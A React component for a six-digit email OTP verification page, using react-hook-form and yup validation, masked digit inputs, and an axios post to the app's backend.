import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [userEmail, setUserEmail] = useState("");

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) setUserEmail(storedEmail);
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then(() => {
        navigate("/success");
      })
      .catch((error) => {
        console.error("OTP verification error", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-between pt-[150px]">
      <div className="px-6 pt-2">
        <div className="flex flex-col items-center space-y-4">
          <div className="w-12 h-12 bg-gray-200 flex items-center justify-center rounded-full">
            <span className="text-2xl">🔐</span>
          </div>
          <p className="text-gray-800 font-medium">
            Enter the 6-digit OTP sent to your email
          </p>
          <p className="text-gray-500 text-sm">{userEmail}</p>

          {/* OTP Form */}
          <form
            onSubmit={handleSubmit(submitForm)}
            className="w-full py-7 space-y-6"
          >
            <input type="hidden" {...register("otp")} />
            <div className="flex justify-center space-x-4 mt-4">
              {otp.map((data, index) => (
                <input
                  key={index}
                  id={`otp-${index}`}
                  type="password"
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onFocus={(e) => e.target.select()}
                  className="w-12 h-12 rounded-full bg-gray-200 text-black text-center text-xl outline-none focus:ring-2 focus:ring-yellow-600"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <FormErrMsg errors={errors} inputName="otp" />

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-full font-semibold transition"
            >
              {loading ? "Processing..." : "Verify OTP"}
            </button>
          </form>

          <button className="text-gray-500 text-sm mt-2">Cancel</button>
        </div>
      </div>
    </div>
  );
};

export default Otp;
